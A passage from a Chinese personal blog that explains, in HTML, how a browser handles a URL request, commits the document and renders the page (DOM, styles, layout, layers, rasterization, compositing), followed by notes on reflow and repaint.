<h2 id="URL-请求过程"><a href="#URL-请求过程" class="headerlink" title="URL 请求过程"></a>URL 请求过程</h2><ul>
<li>进入资源请求过程，浏览器进程通过<code>（IPC）</code>把 <code>URL</code> 请求发送到网络进程，网络进程发起请求</li>
<li>检查本地是否有缓存，如果有直接返回资源给浏览器进程，如果没有，直接进入网络请求</li>
<li><code>DNS</code> 解析，获取 <code>IP</code> 地址，如果是 <code>HTTPS</code> 还要建立 <code>TLS</code> 连接</li>
<li>利用 <code>IP</code> 地址建立 <code>TCP</code> 连接，浏览器端构建请求行、请求头，相关域 <code>cookie</code> 等数据加到请求头，向服务器发送请求信息</li>
<li>服务器根据请求信息生成响应数据，并发给网络进程，然后网络进程开始解析响应头等信息</li>
</ul>
<p>(1) 重定向</p>
<p>如果网络进程在解析响应头，发现状态码是 <code>301</code> 或者 <code>302</code>，那么说明需要浏览器重定向到响应头 <code>Location</code> 指定的 <code>URL</code>，这时，请求再次从头开始</p>
<p>(2) 响应数据类型处理</p>
<p>网络进程在解析响应头时，去告诉浏览器，然后根据不同的 <code>Content-Type</code> 类型，来决定如何显示响应体内容。<br>需要注意的时：如果服务器配置 <code>Conent-Type</code> 不正确，<strong>比如将 <code>text/html</code> 类型的配置成 <code>application/octet-stream</code> 类型，那么浏览器会曲解文件内容。一个 <code>html</code> 文件变成了一个下载文件，这时请求就会交给浏览器的下载管理，并不会交给渲染进程</strong>，这个时候<code>导航流程</code>就结束了。如果时 <code>html</code> 文件，那么将继续准备渲染进程</p>
<h2 id="准备渲染进程"><a href="#准备渲染进程" class="headerlink" title="准备渲染进程"></a>准备渲染进程</h2><ul>
<li>默认情况，浏览器会为每个页面分配一个渲染进程。有一些情况会复用同一个渲染进程，比如：同域（根域名）的情况。这种策略叫做 <code>process-per-site-instance</code></li>
<li>准备好之后，等待网络进程请求的资源，准备解析文档</li>
</ul>
<h2 id="提交文档"><a href="#提交文档" class="headerlink" title="提交文档"></a>提交文档</h2><p>所谓<strong>提交文档，就是浏览器进程将网络进程接受的 HTML 数据提交给渲染进程</strong>，这个过程，<code>浏览器进程</code>、<code>网络进程</code>和<code>渲染进程</code>时紧密联系的</p>
<ul>
<li><code>浏览器进程</code>接收到<code>网络进程</code>的响应头之后，<code>向渲染进程</code>发起<strong>提交文档</strong>的消息</li>
<li><code>渲染进程</code>收到<strong>提交文档</strong>的信息后，和<code>网络进程</code>建立传输数据的管道</li>
<li>等<code>渲染进程</code>和<code>网络进程</code>数据传输完成之后，<code>渲染进程</code>会返回<strong>确认提交</strong>的信息给<code>浏览器进程</code></li>
<li><code>浏览器进程</code>收到<strong>确认提交</strong>之后，会更新浏览器的界面状态，比如，安全状态、前进后退状态、tab 的转圈圈状态</li>
</ul>
<h2 id="渲染阶段"><a href="#渲染阶段" class="headerlink" title="渲染阶段"></a>渲染阶段</h2><h3 id="构建-DOM-树"><a href="#构建-DOM-树" class="headerlink" title="构建 DOM 树"></a>构建 <code>DOM</code> 树</h3><h3 id="样式计算"><a href="#样式计算" class="headerlink" title="样式计算"></a>样式计算</h3><p>样式由：<code>选择器</code>、<code>属性</code>和<code>值</code>组成</p>
<ol>
<li>把 <code>CSS</code> 转换为浏览器理解的结构（<code>CSS</code> 样式来源主要有三种）</li>
</ol>
<ul>
<li>通过 link 外部引入</li>
<li><code>&lt;style&gt;</code>标记内的文件</li>
<li>元素的 <code>style</code> 属性内联 <code>CSS</code></li>
</ul>
<ol start="2">
<li>转换样式表中的属性值，使其标准化</li>
</ol>
<ul>
<li>比如：<code>em-&gt;px</code>，<code>bold-&gt;700</code>，<code>bule-&gt;rbg(0, 0, 255)</code></li>
</ul>
<h3 id="计算出-DOM-树每个节点的具体样式"><a href="#计算出-DOM-树每个节点的具体样式" class="headerlink" title="计算出 DOM 树每个节点的具体样式"></a>计算出 <code>DOM</code> 树每个节点的具体样式</h3><ol>
<li>计算过程遵循 <code>CSS</code> 的<code>继承</code>和<code>样式层叠</code>两个规则</li>
</ol>
<ul>
<li><p>继承：继承如图 <code>fonst-size</code> 解释：</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-06%20221922.png" alt="屏幕截图 2021-12-06 221922"></p>
</li>
<li><p>样式层叠：它定义了如何合并来自多个源的属性值的算法</p>
</li>
</ul>
<h3 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h3><ol>
<li>创建布局树<br>在显示之前，我们还要额外构建一个包含可见元素的<code>布局树</code>，由 <code>DOM</code> 树和 <code>CSS</code> 生成<code>布局树</code></li>
</ol>
<ul>
<li>遍历 <code>DOM</code> 树中可见节点，把节点加到<code>布局树</code>中</li>
</ul>
<ul>
<li>不可见的会被忽略 。如 <code>head</code> 标签下的全部内容、<code>display：none</code> 的元素</li>
</ul>
<ol start="2">
<li>布局计算<br>计算<code>布局树</code>节点的坐标位置，（布局操作时，会把布局计算结果重新写回布局树中）</li>
</ol>
<h3 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h3><p>一些复杂的 3D 变换、页面滚动、或者使用 z-indexing 做 z 轴排序等，还涉及到图层，渲染引擎需要为特定的节点生成专用的图层，并生成一颗对应的图层树（LayerTree）,<br>图层和布局树之间的关系：</p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-06%20224852.png" alt="屏幕截图%202021-11-30%20221332"></p>
<blockquote>
<p>不是布局树每个节点都包含一个图层，节点没有对应的图层，则从属父节点的图层。</p>
</blockquote>
<p>满足下面任意条件，渲染引擎会为其创建新的图层：</p>
<ol>
<li>拥有层叠上下文属性的元素<ul>
<li><code>position</code> 值为 <code>absolute（绝对定位）</code>或 <code>relative（相对定位</code>）且 <code>z-index</code> 值不为 <code>auto</code> 的元素</li>
<li><code>position</code> 值为 <code>fixed（固定定位）</code>或 <code>sticky（粘滞定位）</code>的元素</li>
</ul>
</li>
<li>需要剪裁（clip）的地方<ul>
<li>出现滚动条，滚动条也会被提升为单独层</li>
<li>元素设置 <code>overflow:auto</code></li>
</ul>
</li>
</ol>
<h3 id="图层绘制"><a href="#图层绘制" class="headerlink" title="图层绘制"></a>图层绘制</h3><p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20000234.png" alt="屏幕截图%202021-12-07%20000234"></p>
<p><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20000506.png" alt="屏幕截图%202021-12-07%20000506"></p>
<p>在该图中，区域 1 就是 document 的绘制列表，拖动区域 2 中的进度条可以重现列表的绘制过程。</p>
<h3 id="栅格化（raster）操作"><a href="#栅格化（raster）操作" class="headerlink" title="栅格化（raster）操作"></a>栅格化（raster）操作</h3><p>绘制列表只是用来记录绘制顺序和绘制指令的列表，<strong>实际上绘制操作是由渲染引擎中的合成线程来完成的</strong>。</p>
<ul>
<li><code>合成线程</code>将图层划分为图块</li>
<li><code>合成线程</code>会按照视口附近的图块优先生成位图，所谓栅格化，是指将图块转化为位图</li>
<li>渲染进程维护一个栅格化的线程池，图块栅格化在该线程池执行</li>
<li>栅格化使用 <code>GPU</code> 加速生成（<code>GPU 栅格化</code>或者<code>快速栅格化</code>），生成位图在 <code>GPU</code> 进程执行，生成的位图保存在 <code>GPU</code> 内存</li>
<li>涉及到跨进程操作，<code>渲染进程</code>-&gt;<code>GPU进程</code>，以下图参考：<br><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20002407.png" alt="屏幕截图%202021-12-07%20002407"></li>
</ul>
<h3 id="合成和显示"><a href="#合成和显示" class="headerlink" title="合成和显示"></a>合成和显示</h3><p>所有图块都被栅格化，合成线程就会生成一个绘制图块的命令——<code>DrawQuad</code>，提交给浏览器进程，最终将页面绘制到内存中，再将内存显示在屏幕上</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>渲染进程将 <code>HTML</code> 内容转换为能够读懂的 <strong><code>DOM</code> 树</strong>结构。</li>
<li>渲染引擎将 <strong><code>CSS</code> 样式表转化</strong>为浏览器可以理解的 <code>styleSheets</code>，计算出 <code>DOM</code> 节点的样式。</li>
<li>创建<strong>布局树</strong>，并计算元素的布局信息。</li>
<li>对布局树进行分层，并生成<strong>分层树</strong>。</li>
<li>为每个图层生成<strong>绘制列表</strong>，并将其提交到合成线程。</li>
<li>合成线程将图层分成<strong>图块</strong>，并在<strong>光栅化线程池</strong>中将图块转换成位图。</li>
<li>合成线程发送绘制图块命令 <strong><code>DrawQuad</code></strong> 给浏览器进程。</li>
<li>浏览器进程根据 <code>DrawQuad</code> 消息<strong>生成页面</strong>，并显示到显示器上。</li>
</ol>
<h1 id="回流和重绘"><a href="#回流和重绘" class="headerlink" title="回流和重绘"></a>回流和重绘</h1><ol>
<li><strong>了解浏览器的渲染机制</strong></li>
</ol>
<ul>
<li>浏览器采用<code>流式布局模型</code></li>
<li>浏览器会将 HTML 解析成<code>DOM</code>，把<code>CSS</code>解析成<code>CSSOM</code>，把<code>CSSOM</code>和<code>DOM</code>结合成一个<code>render tree</code></li>
<li>有了<code>render tree</code>之后，就知道了节点样式，然后浏览器会计算节点的位置，然后再绘制再页面上</li>
</ul>
<ol start="2">
<li><strong>回流</strong>：当我们<code>render tree</code>中的一些元素的结构或者尺寸等发生改变，浏览器重新渲染部分或者全部文档的过程就做<code>回流</code>，导致回流的操作如下</li>
</ol>
<ul>
<li>页面首页渲染</li>
<li>浏览器窗口大小变化</li>
<li>内容变化</li>
<li>添加或者删除节点</li>
<li>激活 CSS 伪类</li>
<li>等等</li>
</ul>
<ol start="3">
<li><strong>重绘</strong>：当页面中样式的改变不影响它在文档中的位置，浏览器会将新样式赋予给元素，这个过程叫做<code>重绘</code>，导致重绘的操作如下</li>
</ol>
<ul>
<li>background…</li>
<li>visibility</li>
<li>等等</li>
</ul>
<ol start="4">
<li><strong>性能影响</strong>：回流的性能消耗比重绘大</li>
<li><strong>避免性能影响</strong></li>
</ol>
<p>CSS:</p>
<ul>
<li>避免使用<code>table</code>布局</li>
<li>避免设置多层内联样式</li>
</ul>
<p>JS:</p>
<ul>
<li>避免大量频繁操作<code>DOM</code></li>
<li>对于大量插入<code>DOM</code>的操作，建议使用文档片段，也就是<code>documentFragment</code></li>
</ul>
<ol start="6">
<li>结合图来看：<ul>
<li>回流<br><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20003743.png" alt="屏幕截图%202021-12-07%20003743"></li>
<li>重绘<br><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20003927.png" alt="屏幕截图%202021-12-07%20003927"></li>
<li>直接合成（相对回流和重绘大大提升绘制效率）<br><img src="/images/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202021-12-07%20004017.png" alt="屏幕截图%202021-12-07%20004017"></li>
</ul>
</li>
</ol>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/07/01/browser/readme/" data-id="cl51v209z0000z8vzf79p70p1" data-title="浏览器进程" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-Keepeact" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2022/06/30/Keepeact/" class="article-date">
  <time class="dt-published" datetime="2022-06-30T06:08:20.000Z" itemprop="datePublished">2022-06-30</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2022/06/30/Keepeact/">Keepeact</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p><a target="_blank" rel="noopener" href="https://github.com/wxyhahaha/keepeact">https://github.com/wxyhahaha/keepeact</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://wxyhahaha.github.io/2022/06/30/Keepeact/" data-id="cl51ufjbw0000wkvzcbee59oz" data-title="Keepeact" class="article-share-link">Teilen</a>
      
      
      
    </footer>
  </div>
  
</article>



  


</section>
        
          <aside id="sidebar">
  
    

  
    

  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archiv</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/06/">June 2022</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">letzter Beitrag</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2022/07/01/%E9%9D%A2%E8%AF%95/%E6%B7%B1%E4%BF%A1%E6%9C%8D/">深信服</a>
          </li>
        
          <li>
            <a href="/2022/07/01/vue/readme/">vue</a>
          </li>
        
          <li>
            <a href="/2022/07/01/typescript/readme/">typescript</a>
          </li>
        
          <li>
            <a href="/2022/07/01/style/readme/">style</a>
          </li>
        
          <li>
            <a href="/2022/07/01/js/readme/">js</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 wuxunyu<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>